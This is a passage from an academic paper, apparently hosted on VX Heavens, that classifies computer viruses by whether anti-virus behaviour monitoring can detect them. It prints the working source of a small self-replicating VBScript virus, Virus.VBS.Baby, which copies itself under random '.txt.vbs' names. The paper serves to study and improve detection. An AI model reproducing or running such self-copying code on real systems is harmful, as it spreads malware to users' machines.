<p>It is possible to adjust classification of viruses according to the behaviour monitoring abilities of anti-virus software, and in doing so create a tailored classification that will allow increased efficiency of anti-virus software. For example, if the anti-virus can detect network API calls but not disk read/write calls, then it is logical to classify the network as an external agent but not the disk. Therefore, Type I reproducing malware will (in this classification) be those that do not use the network or any other external entity. The viruses outside Type I will be those that do use external entities, and therefore can be detected at run-time by behaviour monitoring. In other words, we can classify viruses according to whether or not they are detectable at run-time by behaviour monitoring using affordance-based classification. If resources are limited then we may choose to prioritise the detection by static analysis of the Type I viruses since these are not detectable at run-time by behaviour monitoring. This would consequently increase the detection efficiency of the anti-virus software since Type I malware may be detectable by other means, e.g., static analysis, even if it is not detectable at run-time by behaviour monitoring. Viruses outside Type I should be detectable at by behaviour monitoring, so the Type I viruses can be prioritised for non-behavioural detection methods.</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">1 &nbsp;Randomize: <span style="color: #151B8D; font-weight: bold;">On</span> <span style="color: #151B8D; font-weight: bold;">Error</span> <span style="color: #151B8D; font-weight: bold;">Resume</span> <span style="color: #8D38C9; font-weight: bold;">Next</span><br/>
2 &nbsp;<span style="color: #151B8D; font-weight: bold;">Set</span> FSO = <span style="color: #E56717; font-weight: bold;">CreateObject</span>(<span style="color: #800000;">&quot;Scripting.FileSystemObject&quot;</span>)<br/>
3 &nbsp;<span style="color: #151B8D; font-weight: bold;">Set</span> HOME = FSO.GetFolder(<span style="color: #800000;">&quot;.&quot;</span>)<br/>
4 &nbsp;<span style="color: #151B8D; font-weight: bold;">Set</span> Me_ = FSO.GetFile(WScript.ScriptFullName)<br/>
5 &nbsp;Baby = HOME &amp; <span style="color: #800000;">&quot;\&quot;</span> &amp; Chr(Int(Rnd * 25) + 65) &amp;<br/>
&nbsp; &nbsp;Chr(Int(Rnd * 25) + 65) &amp; Chr(Int(Rnd * 25) + 65) &amp;<br/>
&nbsp; &nbsp;Chr(Int(Rnd * 25) + 65) &amp; Chr(Int(Rnd * 25) + 65) &amp;<br/>
&nbsp; &nbsp;Chr(Int(Rnd * 25) + 65) &amp; Chr(Int(Rnd * 25) + 65) &amp;<br/>
&nbsp; &nbsp;Chr(Int(Rnd * 25) + 65) &amp; Chr(Int(Rnd * 25) + 65) &amp; <span style="color: #800000;">&quot;.txt.vbs&quot;</span><br/>
6 &nbsp;Me_.Copy(Baby)<br/>
&nbsp;</div>
<p>Figure 3: Virus.VBS.Baby. Several non-functional lines have been omitted.</p>
<p>Therefore, we can see that anti-virus software imposes a restricted form of the ontology, where external entities are defined as those things beyond the virus, but whose communications with the virus (via an API, for example) can be intercepted by the anti-virus software. The logical conclusion here is that on systems without anti-virus software capable of behaviour scanning, all viruses are Type I. Therefore, all viruses with a Type I classification are impossible to detect at run-time by behaviour monitoring, whereas those outside Type I have detectable behaviours and are, at least theoretically, detectable. Of course, the exact delineation between Type I and non-Type I is dependent on the ontology that is "enforced" by the anti-virus scanner: computer viruses that are Type I with respect to one anti-virus software may not be Type I with respect to another. For example, an anti-virus scanner that could not intercept network API calls may not be able to detect any behaviour of a given worm, thus rendering it Type I. However, another anti-virus scanner with the ability to monitor network traffic might be able to detect the activity of the worm, resulting in a different classification of non-Type I.</p>
<h3>3.2 Automated Classification: Virus.VBS.Baby</h3>
<p>In this subsection we will demonstrate automated classification by static analysis, in a way that would be straightforward to implement algorithmically. Baby (see Fig. 3) is a simple virus written in Visual Basic Script for the Windows platform. In line 1 the random number generator is seeded using the system timer. Next, an object <code>FSO</code> of the class <code>Scripting.FileSystemObject</code> is created, which allows the virus to access the file system. A string <code>HOME</code> is set using the <code>FSO.GetFolder(...)</code> method to access the directory in which Baby is executing. In line 5 the object <code>Me_</code> is created as a handle to the file containing the virus's Visual Basic script. In line 5 Baby generates a random filename, with the path set to Baby's current directory, and in line 6 Baby makes a copy of itself using the <code>Me_</code> object, completing the reproductive process.</p>
<p>Automated classification by static analysis would involve searching the virus code for the use of external entities. Of course, whether we consider an entity to be external should depend the abilities of the anti-virus software. Therefore, we will consider three different situations corresponding to different configurations of the anti-virus software.</p>
<p>In the first configuration, the anti-virus software is unable to analyse the behaviour at run-time at all, i.e., behaviour monitoring is non-existent. In this case, the anti-virus software is unable to distinguish between the virus and any other external entities, and therefore there is just one entity in the reproduction model: the virus itself. Therefore none of the actions in the labelled transition system (i.e, the virus's program) can be afforded by an external entity, and therefore the classification of Baby under this configuration is Type I.</p>
<p>In the second configuration, behaviour monitoring is switched on and the anti-virus software is able to intercept calls to external entities. Behaviour monitoring is achieved in a number of ways [8], which are are often very implementation-specific (see, e.g., [23]). So, for the purposes of this example we will simply assume that calls to methods and attributes that are not part of Baby's code must be external to baby, and that behaviour monitoring can intercept these calls. We can see that lines 1, 3 and 6 include references to one external method or attribute, and lines 2 and 4 include references to two methods or attributes. In this configuration the Baby entity is present, and but there is at least one other external entity (depending on how we assign methods/properties to entities). One thing is certain in this configuration: external entities are affording actions to Baby, and therefore Baby is a non-Type I computer virus.</p>
<p>In the third configuration, behaviour monitoring is again switched on, but Baby is being executed in a sandbox by the anti-virus software. In this model Baby is again an entity, but there is another entity in the form of the sandbox which affords Baby all its actions, for the simple reason the sandbox emulates Baby's code within a virtual machine that is completely monitored by the anti-virus software. Therefore, in this configuration Baby must also be a non-Type I computer virus.</p>
<p>This example has shown the close relationship between "configurations" of anti-virus software and the resulting constraints on any reproduction model that we might make of a computer virus. This in turn affects the classification of a virus into Type I or non-Type I.</p>
<h3>3.3 Automated Classification: Virus.VBS.Archangel</h3>
<p>In Section 2.5 we categorised Archangel (see Fig. 2) using a minimalistic reproduction model, constructed by hand. In this section we will contrast the method of automated classification. In a similar way to the Virus.VBS.Baby example, we will present three different classifications of Archangel using three different anti-virus configurations identical to those used for Baby's classification.</p>
<p>In the first configuration there is no anti-virus behaviour monitoring. As a result the only entity present in Archangel's reproduction model is the virus itself. Therefore we know that no external entity affords actions to the virus, and therefore Archangel is Type I in this model.</p>
<p>In the second configuration, an anti-virus scanner is present and is able to distinguish calls to external methods and properties. Archangel contains a total of 38 such calls to such methods and properties as <code>MsgBox, CreateObject, FileSystemObject, FolderExists, CreateFolder, CopyFile, ScriptFullName, MoveFile, CreateObject, FolderExists, DeleteFile, CreateShortCut, ExpandEnvironment, WindowStyle, Save, CreateTextFile, WriteLine, Close</code> and <code>Run</code>. Therefore Archangel can be categorised automatically as a non-Type I virus.</p>
<p>In the third configuration, Archangel is executed within a sandbox by the anti-virus software. Since all instructions are emulated, the anti-virus software is able to detect all behavioural activity, placing Archangel as a non-Type I computer virus.</p>
<h3>3.4 Non-Type I Virus Metrics</h3>
<p>We have shown how different viruses can be classified as Type I or non-Type I based on whether they are reproductively non-reliant or reliant (respectively) on external entities. However, it is possible to go further and develop metrics for comparing viruses outside Type I for the purposes of prioritisation for anti-virus software. For example, there may be <img src="/img/cache/7b8b965ad4bca0e41ab51de7b31363a1.gif" alt="n" valign="middle"/> different calls that a virus can make which we might class as being the responsibility of an external entity. So, in the least reliant non-Type I viruses, there may be only one such call in the virus. Therefore, there are only <img src="/img/cache/7b8b965ad4bca0e41ab51de7b31363a1.gif" alt="n" valign="middle"/> different behavioural signatures that we can derive from knowing that there is one such call to an external entity. Clearly, as the number, <img src="/img/cache/6f8f57715090da2632453988d9a1501b.gif" alt="m" valign="middle"/>, of such calls increases, the number of different behavioural signatures, <img src="/img/cache/44f018db84c2d0eace91dca9541cd502.gif" alt="n^m" valign="middle"/>, increases exponentially. Therefore viruses that have more calls to external entities may be more detectable at run-time, and conversely, viruses that have fewer calls may be more difficult to detect. Therefore we might propose a simple metric for analysing the reliance on external entities of a given virus: calculate the number of calls to external entities. The more calls there are, the more behavioural signatures there are, and the easier detection should become. This metric therefore lets us compare all those viruses outside Type I, and decide which are the most and least detectable by behaviour monitoring.</p>
<p>Using this simple metric to compare the Baby and Archangel VBS viruses. We see that Baby contains seven references to external methods or properties, whereas Archangel contains 38. Using this na&iuml;ve metric, we can see that Archangel reliance on external entities is greater than Baby's, and therefore we could place Baby higher in a priority list when using detection methods other that behaviour monitoring.</p>
<h3>3.5 Anti-Virus Configurations and Ontologies</h3>
<p>In the examples presented above, Baby and Archangel were classified using three different anti-virus configurations. In the first configuration, there is no behaviour monitoring switched on, and as a result Baby and Archangel are classified as Type I. However, this classification is not restricted to these two viruses; any virus viewed within this anti-virus configuration must be classified as Type I, since the anti-virus software is not able to distinguish between the virus and any other external entities. Since the intended purpose of the Type versus non-Type I distinction is to separate viruses according to the possibility of detection at run-time by behaviour monitoring, it follows that if run-time behaviour monitoring detection is inactive (as is the case in this configuration where behaviour monitoring is not possible) then all viruses must be Type I.</p>
<p>A similar case is in the third configuration, where the virus runs within a sandbox, and its code is completely emulated by the anti-virus software. In this case, any virus will be completely monitored, meaning that any virus's behaviour is known to the anti-virus software and therefore can be detected at run-time by behaviour monitoring. Consequently, in this configuration all viruses must be non-Type I.</p>
<p>The second configuration, however, which most closely resembles the reallife situations encountered with anti-virus software, is also the most interesting in terms of variety of classification. It was seen that Baby and Archangel were non-Type I, and then we showed how based on a simple metric we could compare their relative reliance on external entities, under the assumption that the more reliant on external entities a virus is, the more behavioural signatures are possible and the more likely we are to detect that virus at runtime by behaviour monitoring. It is also the case that some viruses could be classified as Type I, although we have not presented such an example here. For example, some viruses such as NoKernel (p. 219, [23]) can access the hard disk directly and bypass methods which use the operating system API. Since API monitoring might be the method by which an anti-virus software conducts its behaviour monitoring, then such a virus would be undetectable at run-time (assuming that it did not use any other external entities that were distinguishable by the anti-virus software).</p>
<p>Therefore, the ideal case for an anti-virus software is the ability to classify all viruses as non-Type I within its ontology. However, this may not be possible for practical reasons, and therefore the aim of writers of anti-virus software should be to maximise the number of viruses outside Type I, and then to maximise the number of viruses with a high possibility for detection using metric-based methods discussed earlier.</p>
<h2>4 Conclusion</h2>
<p>We have shown how it possible to classify reproducing malware, such as computer viruses, using an affordance-based ontology based on formal models of reproduction. We are able to formalise a reproductive process using a labelled transition system, and divide up the environment of a computer virus into separate entities, of which the computer virus (as the reproducer in the reproductive system) is one. Then, we can attribute different actions in the reproductive process to different entities, and based on these dependencies classify the computer virus as Type I (of the virus is reproductively isolated) or non-Type I (if the virus depends on the use of external entities to reproduce). We can further sub-divide viruses outside Type I based on abstract reproductive actions such as the self-description, reproductive mechanism or, in the case of computer viruses, payload. The presence or absence of self-description and/or reproductive mechanism actions divides up the non-Type I reproducer space into Types II, III and IV, and consequently viruses can be classified similarly. We have shown how this classification can take place by hand, through the construction of formal models, or automatically, by a simple algorithm that uses static or dynamic analysis to test the computer virus for its reliance on external entities.</p>
<p>We have shown that whilst Type II, III and IV classification may pose problems for automated classification, Type I versus non-Type classification is readily achievable using current computing technology, and that this dichotomous classification can be used to separate viruses into one of two categories depending on whether they are dependent on external entities, or not. By constructing our notion of externality with respect to a particular anti-virus software, the resulting classification divides computer viruses into those where detection is either possible (non-Type I) or impossible (Type I) by behaviour monitoring at run-time. By modifying the definition of the anti-virus software being modelled, the viruses can be easily re-classified to suit other types of anti-virus software.</p>
<p>We discussed in Section 3 how this classification might be applied to computer virus detection by enabling prioritisation of detection. For example, a set of virus placed into Type I might not be detectable at run-time by behaviour monitoring, and therefore we can concentrate our efforts on those virus in this class for detection by non-behavioural means. Furthermore, we showed how metrics can be introduced to quantify the reliance of those viruses outside Type I on external entities, thus giving a priority list for detection by non-behavioural means and in Section 3.4 we showed how even a simple metric can give a means for prioritisation.</p>
<p>Our classification of computer viruses is a special case of the classification of reproducers from our earlier work [29, 27], which logically places computer viruses within the broader class of reproducers. This relationship between viruses and other forms of life has been explored by Spafford [22], which resulted in interesting insights into reproducing malware. This comparison between computer viruses and their biological counterparts has resulted in interesting techniques for anti-virus software such as computer immune systems [17, 21, 14], and in that sense we hope that the relationship between computer viruses and reproducers (including biological viruses) proven further by this paper could assist in the application of biological concepts to the problem of malware prevention.</p>
<h3>4.1 Comparison with Other Approaches</h3>
<p>Virus classification schemes are numerous and diverse. While the means of a particular classification might be objective, the decision of preference of one classification over another can often be subjective; in this sense classification is in the eye of the beholder. Consequently it is difficult to assess rationally how well our classification works in comparison to those that have come before. Most classifications arise from some insight into the universe of objects being classified, and therefore the only requirement upon a classification being considered "worthy" is that it should have some explanatory power. Therefore, instead of attempting a futile rationalization of our classification versus the many interesting and insightful classifications of others, we will delineate the explanatory power of our approach.</p>
<p>Intuitively, computer viruses that are classified as Type I within our classification are those that are reproductively isolated, i.e., those that do not require the help of external entities during their reproductive process. Consequently, those outside Type I require help of external entities for their reproduction. We have shown via multiple classifications of the same virus based on the modification of reproduction models (see Sections 2.3, 2.5, 2.6, 3.2 and 3.3) that our ontology and classification are sufficiently unconstrained so as to allow flexibility of classification, and therefore it might seem that our classification is arbitrary. We consider this flexibility rather that arbitrariness, however, as it allows for the classification of computer viruses towards more efficient detection methods for anti-virus software, as given in Section 3. Therefore, once we have settled upon a fixed notion of externality, our classification provides the means to classify viruses in a formal and useful way to help improve the possibility of detection. Furthermore, through this classification we have introduced a means to compare formally the abilities of different anti-virus software that employ behaviour monitoring. As given in Section 3.5, the anti-virus software most able to detect viruses by behaviour monitoring will be those whose ontologies minimise the classification of viruses within Type I, and maximise the numbers of viruses outside Type I with a high chance of detection at run-time by behaviour monitoring, via metrics such as those described in Section 3.4.</p>
<h3>4.2 Future Work</h3>
<p>In Section 3.4 we showed how using a simple metric we could compare the reliance on external entities of two viruses written in Visual Basic Script. It should also be possible to develop more advanced metrics for comparing viruses outside Type I. For example, a certain sequence of actions which require external entities may flag with a certain level of certainty a given viral behaviour. Therefore it would seem logical to incorporate this into a <em>weighted</em> metric that reflects the particular characteristics of the non-Type I viruses. Different metrics could be employed for different languages, if different methods of behaviour monitoring are used for Visual Basic Script and Win32 executables, for example.</p>
<p>Following on from the discussion above, another possible application of our approach is towards the assessment of anti-virus behaviour monitoring software via affordance-based models. There are some similarities between our approach and the recent work by Filiol et al [9] on the evaluation of behavioural detection strategies, particularly in the use of abstract actions in reasoning about viral behaviour. Also, the use of behavioural detection hypotheses bears a resemblance to our proposed antivirus ontologies. In future we would like to explore this relationship further, perhaps by generating a set of benchmarks based on our ontology and classification, similar to those given by Filiol et al.</p>
<p>Recent work by Bonfante et al [3] discusses classification of computer viruses using recursion theorems, in which a notion of externality is given through formal definitions of different types of viral behaviour, e.g., companion viruses and ecto-symbiotes that require the help of a external entities, such as the files they infect. An obvious extension of this work would be to work towards a description of affordance-based classification of computer viruses using recursion theorems, and conversely, a description of recursion-based classification in terms of formal affordance theory.</p>
<h2>Acknowledgements</h2>
<p>We would like to thank the participants of the 2nd International Workshop on the Theory of Computer Viruses (TCV 2007) for their useful questions and comments. VX Heavens (<a href="http://vx.netlux.org/">http://vx.netlux.org/</a>) and Gary P. Thompson II's, "The Quine Page" (<a href="http://www.nyx.net/~gthompso/quine.htm">http://www.nyx.net/~gthompso/quine.htm</a>) were essential sources of virus code for this paper. The Unix shell script virus in Fig. 1 was based on similar work by Bruce Ediger (<a href="http://www.users.qwest.net/~eballen1/">http://www.users.qwest.net/~eballen1/</a>).</p>
<h2>References</h2>
<ol>
<li>Leonard M. Adleman. <a href="/lib/ala01.html">An abstract theory of computer viruses</a>. In <em>Advances in Cryptology - CRYPTO `88</em>, volume 403 of <em>Lecture Notes in Computer Science</em>, pages 354-374, 1990.</li>
<li>Michael Bailey, Jon Oberheide, Jon Andersen, Z. Morley Mao, Farnam Jahanian, and Jose Nazario. Automated classification and analysis of internet malware. Technical Report CSE-TR-530-07, Department of Electrical Engineering and Computer Science, University of Michigan, April 2007.</li>
<li>Guillaume Bonfante, Matthieu Kaczmarek, and Jean-Yves Marion. On abstract computer virology: from a recursion-theoretic perspective. <em>Journal in computer virology</em>, 1(3-4), 2006.</li>
<li>Guillaume Bonfante, Matthieu Kaczmarek, and Jean-Yves Marion. A classification of viruses through recursion theorems. In S.B. Cooper, B. L&ouml;we, and A. Sorbi, editors, <em>CiE 2007</em>, volume 4497 of <em>Lecture Notes in Computer Science</em>. Springer-Verlag Berlin Heidelberg, 2007.</li>
<li>Vesselin Bontchev, Fridrik Skulason, and Alan Solomon. CARO virus naming convention. http://www.caro.org/, 1991.</li>
<li>Ero Carrera and Gergely Erd´elyi. Digital genome mapping - advanced binary malware analysis. In <em>Virus Bulletin Conference</em>, September 2004.</li>
<li>Fred Cohen. <a href="/lib/afc01.html">Computer viruses - theory and experiments</a>. <em>Computers and Security</em>, 6(1):22-35, 1987.</li>
<li>Eric Filiol. <em>Computer Viruses: from Theory to Applications</em>. Springer, 2005. ISBN 2287239391.</li>
<li>Eric Filiol, Gr&eacute;goire Jacob, and Micka&euml;l Le Liard. Evaluation methodology and theoretical model for antiviral behavioural detection strategies. <em>Journal in Computer Virology</em>, 3:23-37, 2007.</li>
<li>Marius Gheorghescu. An automated virus classification system. In <em>Virus Bulletin Conference</em>, October 2005.</li>
<li>James J. Gibson. The theory of affordances. <em>Perceiving, Acting and Knowing: Toward an Ecological Psychology</em>, pages 67-82, 1977.</li>
<li>L. A. Goldberg, P. W. Goldberg, C. A. Phillips, and G. B. Sorkin. Constructing computer virus phylogenies. <em>Journal of Algorithms</em>, 26(1):188-208, 1998.</li>
<li>Sarah Gordon. Virus and vulnerability classification schemes: Standards and integration. Symantec Security Response White Paper, February 2003. http://www.symantec.com/avcenter/reference/virus.and.vulnerability.pdf.</li>
<li>Michael Hilker and Christoph Schommer. SANA - security analysis in internet traffic through artificial immune systems. In Serge Autexier, Stephan Merz, Leon van der Torre, Reinhard Wilhelm, and Pierre Wolper, editors, <em>Workshop "Trustworthy Software" 2006</em>. IBFI, Schloss Dagstuhl, Germany, 2006.</li>
<li>Md. Enamul Karim, Andrew Walenstein, and Arun Lakhotia. Malware phylogeny using maximal pi-patterns. In <em>EICAR 2005 Conference: Best Paper Proceedings</em>, pages 156-174, 2005.</li>
<li>Md. Enamul Karim, Andrew Walenstein, Arun Lakhotia, and Laxmi Parida. Malware phylogeny generation using permutations of code. <em>Journal in Computer Virology</em>, 1:13-23, 2005.</li>
<li>Jeffrey O. Kephart. A biologically inspired immune system for computers. In Rodney A. Brooks and Pattie Maes, editors, <em>Artificial Life IV, Proceedings of the Fourth International Workshop on Synthesis and Simulation of Living Systems</em>, pages 130-139. MIT Press, Cambridge, Massachusetts, 1994.</li>
<li>Jimmy Kuo and Desiree Beck. The common malware enumeration initiative. <em>Virus Bulletin</em>, pages 14-15, September 2005.</li>
<li>Jose Andre Morales, Peter J. Clarke, Yi Deng, and B. M. Golam Kibria. Testing and evaluating virus detectors for handheld devices. <em>Journal in Computer Virology</em>, 2(2), 2006.</li>
<li>Daniel Reynaud-Plantey. The Java mobile risk. <em>Journal in Computer Virology</em>, 2(2), 2006.</li>
<li>Anil Somayaji, Steven Hofmeyr, and Stephanie Forrest. <a href="/lib/afo02.html">Principles of a computer immune system</a>. In <em>1997 New Security Paradigms Workshop</em>. ACM Press, 1997.</li>
<li>Eugene H. Spafford. <a href="/lib/aes02.html">Computer viruses as artificial life</a>. <em>Journal of Artificial Life</em>, 1(3):249-265, 1994.</li>
<li>Peter Sz&ouml;r. <em><a href="/lib/aps00.html">The Art of Computer Virus Research and Defense</a></em>. Addison-Wesley, 2005. ISBN 0321304543.</li>
<li>Sampo T&ouml;yssy and Marko Helenius. About malicious software in smartphones. <em>Journal in Computer Virology</em>, 2(2), 2006.</li>
<li>Nicholas Weaver, Vern Paxson, Stuart Staniford, and Robert Cunningham. <a href="/lib/anw01.html">A taxonomy of computer worms</a>. In <em>WORM '03: Proceedings of the 2003 ACM Workshop on Rapid Malcode</em>, pages 11-18. ACM Press, 2003.</li>
<li>Matt Webster. <a href="/lib/amw00.html">Algebraic specification of computer viruses and their environments</a>. In Peter Mosses, John Power, and Monika Seisenberger, editors, <em>Selected Papers from the First Conference on Algebra and Coalgebra in Computer Science Young Researchers Workshop (CALCO-jnr 2005). University of Wales Swansea Computer Science Report Series CSR 18-2005</em>, pages 99-113, 2005.</li>
<li>Matt Webster and Grant Malcolm. Reproducer classification using the theory of affordances: Models and examples. <em>International Journal of Information Technology and Intelligent Computing</em>. To appear.</li>
<li>Matt Webster and Grant Malcolm. Detection of metamorphic computer viruses using algebraic specification. <em>Journal in Computer Virology</em>, 2(3):149-161, December 2006. DOI: 10.1007/s11416-006-0023-z.</li>
<li>Matt Webster and Grant Malcolm. Reproducer classification using the theory of affordances. In <em>Proceedings of the 2007 IEEE Symposium on Artificial Life (CI-ALife 2007)</em>, pages 115-122. IEEE Press, 2007.</li>
<li>Stephanie Wehner. Analyzing worms and network traffic using compression. <em>Journal of Computer Security</em>, 15(3):303-320, 2007. arXiv:cs/0504045v1 [cs.CR].</li>
<li>Christos Xenakis. Malicious actions against the GPRS technology. <em>Journal in Computer Virology</em>, 2(2), 2006.</li>
</ol>
[<a style="" href="/lib/?lang=EN&amp;index=TH#amw01">Back to index</a>] [<a href="/lib/amw01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=amw01">de</a><a href="/lib/index.php?lang=en&amp;id=amw01">en</a><a href="/lib/index.php?lang=es&amp;id=amw01">es</a><a href="/lib/index.php?lang=it&amp;id=amw01">it</a><a href="/lib/index.php?lang=fr&amp;id=amw01">fr</a><a href="/lib/index.php?lang=pl&amp;id=amw01">pl</a><a href="/lib/index.php?lang=ru&amp;id=amw01">ru</a><a href="/lib/index.php?lang=ua&amp;id=amw01">ua</a></div>
</body>
</html>
